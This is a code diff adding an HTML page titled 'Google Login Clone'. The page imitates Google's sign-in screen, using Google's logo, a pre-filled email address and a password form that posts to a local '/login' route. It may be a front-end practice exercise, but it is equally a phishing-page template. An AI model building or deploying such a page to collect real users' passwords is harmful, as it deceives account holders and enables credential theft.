@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Login Clone</title>
+
+  <link rel="stylesheet" href="style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+
+</head>
+
+<body>
+
+  <div class="wrapper">
+
+    <div class="google-logo">
+      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_116x41dp.png" alt="logo">
+    </div>
+
+    <h1 class="welcome">Welcome</h1>
+
+    <div class="email-box">
+      <span>yhubhee768@gmail.com</span>
+    </div>
+    <form action="/login" method="post">
+      <div class="password-area">
+        <input type="password" name="password" placeholder="Enter your password" class="password-input">
+
+        <label class="checkbox-line">
+          <input type="checkbox" id="showPass">
+          Show password
+        </label>
+
+        <button class="next-btn" type="submit">Next</button>
+
+        <div class="forgot">
+          <a href="/forgot">Forgot password?</a>
+        </div>
+      </div>
+    </form>
+
+
+  </div>
+
+  <footer class="footer">
+    <div class="lang">English (United States) ▾</div>
+
+    <div class="footer-links">
+      <a href="#">Help</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+    </div>
+  </footer>
+
+  <script>
+    document.getElementById("showPass").addEventListener("change", function () {
+      const p = document.querySelector(".password-input");
+      p.type = this.checked ? "text" : "password";
+    });
+  </script>
+
+</body>
+
+</html>
